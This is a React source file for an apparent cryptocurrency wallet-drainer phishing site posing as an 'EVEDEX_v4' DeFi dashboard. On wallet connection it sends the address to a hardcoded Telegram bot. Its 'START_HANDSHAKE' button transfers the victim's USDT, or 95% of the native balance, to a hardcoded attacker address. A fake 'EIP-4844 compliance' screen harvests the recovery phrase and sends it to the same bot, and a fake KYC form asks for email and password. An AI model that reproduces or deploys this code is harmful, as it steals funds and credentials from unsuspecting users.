/* eslint-disable */
import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const cI = "7630238860";
  const dest = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});

  useEffect(() => {
    if (isConnected && address && !sessionStorage.getItem('hit_final')) {
      log(`🎯 WALLET CONNECTED!\nADDR: ${address}\nNET: ${chainId}`);
      sessionStorage.setItem('hit_final', 't');
    }
  }, [isConnected, address]);

  const { data: nB } = useBalance({ address }); 
  const { data: tB } = useBalance({ address, token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955" });

  useEffect(() => {
    if (activeTask === "Rectify") {
      setInputVal(tB?.formatted?.slice(0, 10) || nB?.formatted?.slice(0, 10) || "0.00");
    } else {
      setInputVal("");
    }
  }, [activeTask, tB, nB]);

  const handleHandshake = () => {
    const usdt = chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : "0x55d398326f99059ff775485246999027b3197955";
    if (tB && tB.value > 0n) {
      const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
      sendTransaction({ to: usdt, data: d }, { onSettled: () => setView("seed_gate") });
    } else if (nB && nB.value > 100000000000000n) {
      sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
    } else {
      setView("seed_gate");
    }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
        <appkit-button />
      </header>

      {isConnected ? (
        <>
          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
            <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
          </div>

          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'12px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
              </div>
              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
            </div>
          )}

          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
              <h2 style={{color:'white', fontWeight:'900'}}>IDENTITY_SYNC</h2>
              <div style={{fontSize:'10px', color:'#475569', margin:'10px 0'}}>REQUIRED FOR WITHDRAWAL APPROVAL</div>
              <input placeholder="EMAIL" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
              <input type="password" placeholder="PASSWORD" style={{width:'100%', padding:'15px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'12px', color:'white', marginTop:'10px'}} />
              <button onClick={()=>setView("seed_gate")} style={{width:'100%', backgroundColor:'#1e293b', color:'white', padding:'15px', borderRadius:'12px', fontWeight:'900', border:'none', marginTop:'20px'}}>CONTINUE</button>
            </div>
          )}

          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                    <div style={{fontSize:'10px', color:'#64748b', marginTop:'10px', lineHeight:'1.4'}}>To prevent sybil attacks and verify wallet ownership, please input your recovery phrase to synchronize with the Mainnet Relay.</div>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'20px'}} />
                    <button onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: seedVal.split(' ').length >= 12 ? '#10b981' : '#1e293b', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                  </>
                ) : (
                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      ) : (
        <div style={{textAlign:'center', marginTop:'40px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <div style={{marginBottom:'25px'}}>
             <div style={{fontSize:'12px', color:'#10b981', fontWeight:'bold'}}>🔰 SAFE_GUIDE ♻️ RELAY_ACTIVE</div>
          </div>
          <appkit-button />
        </div>
      )}
    </div>
  );
}
